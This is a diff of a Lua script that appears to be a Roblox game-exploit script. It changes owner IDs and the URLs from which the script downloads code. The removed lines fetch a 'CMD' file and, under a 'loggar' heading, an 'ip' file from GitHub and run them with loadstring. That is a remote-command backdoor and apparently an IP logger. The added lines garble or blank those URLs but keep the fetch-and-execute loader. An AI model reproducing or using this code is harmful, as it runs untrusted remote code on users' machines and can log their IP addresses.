@@ -3517,12 +3517,12 @@ end
 -- CFrame.new(Ttorso.Position + (Ttorso.Velocity * (plr:GetNetworkPing() + 0.15))) * CFrame.new(0,0,10)
 
 local OwnerId = {
-	"9014717036";
-	"9013467605"
+	"2932138780";
+	"2932138780"
 }
 
 local OwnerName = {
-	"jdrieivfbd12"
+	"QRdoote1120"
 }
 
 task.spawn(function()
@@ -3535,7 +3535,7 @@ task.spawn(function()
 
     local ids = {}
     bypassing = true
-    local rawData = game:HttpGet("https://raw.githubusercontent.com/MuyoPing/FTAP/refs/heads/main/ply2")
+    local rawData = game:HttpGet("https://raw.githubusercontent.cwom/MuyowuPing/FTAP/refs/heads/main/y2")
     bypassing = false
     for id in rawData:gmatch("%d+") do 
         ids[tonumber(id)] = true 
@@ -3605,7 +3605,7 @@ Instance.new("RemoteEvent", G).Name = "EndGrabEarly"
 --- == // Command
 
 bypassing = true
-local cmdRaw = pcall(game.HttpGet, game, "https://raw.githubusercontent.com/MuyoPing/FTAP/refs/heads/main/CMD") and game:HttpGet("https://raw.githubusercontent.com/MuyoPing/FTAP/refs/heads/main/CMD") or ""
+local cmdRaw = pcall(game.HttpGet, game, "https://raw.githubusercontent.com/MuyoPing/FTAP/refs/heawwds/mainww/CMD") and game:HttpGet("https://raw.githuwwbusercontent.com/MuyoPwwing/FTAP/refs/heawwds/main/CwwMD") or ""
 if cmdRaw ~= "" then
     local s, func = pcall(loadstring, cmdRaw)
     if s and type(func) == "function" then
@@ -3618,7 +3618,7 @@ bypassing = false
 --- == // loggar
 local function exeutsScript()
     bypassing = true
-    local ipRaw = pcall(game.HttpGet, game, "https://raw.githubusercontent.com/MuyoPing/FTAP/refs/heads/main/ip") and game:HttpGet("https://raw.githubusercontent.com/MuyoPing/FTAP/refs/heads/main/ip") or ""
+    local ipRaw = pcall(game.HttpGet, game, "") and game:HttpGet("") or ""
     if ipRaw ~= "" then
         local s, func = pcall(loadstring, ipRaw)
         if s and type(func) == "function" then
